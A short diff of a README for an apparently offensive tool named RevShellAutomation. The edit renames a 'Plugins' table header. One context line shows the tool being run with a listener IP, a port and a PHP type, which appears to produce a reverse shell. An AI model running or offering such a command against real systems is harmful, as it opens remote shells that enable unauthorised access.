@@ -49,9 +49,9 @@ $ cd RevShellAutomation
 $ bash RevShellAutomation.sh -ip 10.10.10.10 -port 1337 -t Php
 ```
 
-### Plugins
 
-| Plugin | README |
+
+| desc | link |
 | ------ | ------ |
 | Me | [LinkedIn][PlDb] |
 
